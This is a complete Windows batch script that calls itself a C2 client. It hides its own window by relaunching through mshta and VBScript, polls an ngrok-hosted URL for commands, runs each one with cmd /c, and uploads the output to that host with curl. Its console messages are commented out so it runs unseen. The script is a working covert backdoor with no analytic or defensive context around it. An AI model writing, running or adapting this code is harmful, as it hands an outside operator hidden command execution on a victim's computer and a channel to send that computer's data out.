@echo off
if "%~1"=="::" (shift & goto :hidden_main)

rem Self-relaunch hidden
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run """"%~f0"" ::"", 0:close")
exit /b

:hidden_main
setlocal enabledelayedexpansion
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
set LAST_CMD=

rem Echo removed - no console to see it anyway
rem echo [*] Starting C2 Client
rem echo [*] URL: %URL%

:loop
    ping -n 3 127.0.0.1 >nul
    
    rem Save raw response for debugging
    curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>nul
    rem echo [DEBUG] Raw response: - removed
    rem type %TEMP%\c2_raw.txt - removed
    
    rem Get FIRST non-empty line as command
    set CMD=
    for /f "usebackq delims=" %%A in (`type %TEMP%\c2_raw.txt ^| findstr /v "^$"`) do (
        if "!CMD!"=="" (
            set CMD=%%A
            rem echo [DEBUG] Got command: !CMD! - removed
            goto :got_command
        )
    )
    goto loop
    
:got_command
    if "!CMD!"=="" goto loop
    if "!CMD!"=="WAITING" goto loop
    
    if "!CMD!"=="!LAST_CMD!" (
        rem echo [*] Skipping duplicate: !CMD! - removed
        goto loop
    )
    
    set LAST_CMD=!CMD!
    rem echo [*] Executing: !CMD! - removed
    
    set TEMPFILE=%TEMP%\c2_output.txt
    cmd /c "!CMD!" > "!TEMPFILE!" 2>&1
    
    if exist "!TEMPFILE!" (
        curl -X POST --data-binary @"!TEMPFILE!" --max-time 10 %URL% 2>nul
        del "!TEMPFILE!" 2>nul
    )
    
    set CMD=
    timeout /t 2 /nobreak >nul
    
goto loop
